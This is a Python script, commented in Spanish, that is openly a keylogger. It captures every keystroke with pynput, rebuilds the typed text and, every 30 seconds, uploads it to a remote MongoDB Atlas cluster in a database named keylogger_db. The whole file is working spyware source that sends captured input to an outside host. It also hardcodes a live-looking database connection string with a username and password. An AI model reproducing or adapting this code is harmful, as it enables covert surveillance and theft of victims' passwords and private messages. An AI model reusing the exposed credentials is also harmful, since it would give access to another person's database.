import threading
import time
from pynput import keyboard
from pymongo import MongoClient

# Conexión a MongoDB
mongo_uri = "mongodb+srv://iraldejordan10:r5dcxq5RHNDrxt69@jarviscluster.et2fo.mongodb.net/"
client = MongoClient(mongo_uri)
db = client["keylogger_db"]       # Nombre de la base de datos
collection = db["keystrokes"]     # Nombre de la colección

# Lista para almacenar las teclas pulsadas
keystrokes = []

def on_press(key):
    try:
        keystrokes.append(key.char)
    except AttributeError:
        # Maneja teclas especiales
        if key == keyboard.Key.space:
            keystrokes.append(' ')
        elif key == keyboard.Key.enter:
            keystrokes.append('\n')
        elif key == keyboard.Key.tab:
            keystrokes.append('\t')
        elif key == keyboard.Key.backspace and keystrokes:
            keystrokes.pop()  # Eliminar la última tecla registrada en caso de backspace

def store_keystrokes():
    while True:
        time.sleep(30)  # Espera 5 minutos (300 segundos)
        if keystrokes:
            # Unir las teclas en una sola cadena de texto
            data = ''.join(keystrokes)
            # Insertar en la colección
            collection.insert_one({"text": data})
            keystrokes.clear()  # Limpiar la lista después de almacenarla

# Iniciar el hilo de almacenamiento en segundo plano
store_thread = threading.Thread(target=store_keystrokes)
store_thread.daemon = True
store_thread.start()

# Escuchar las teclas en segundo plano
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
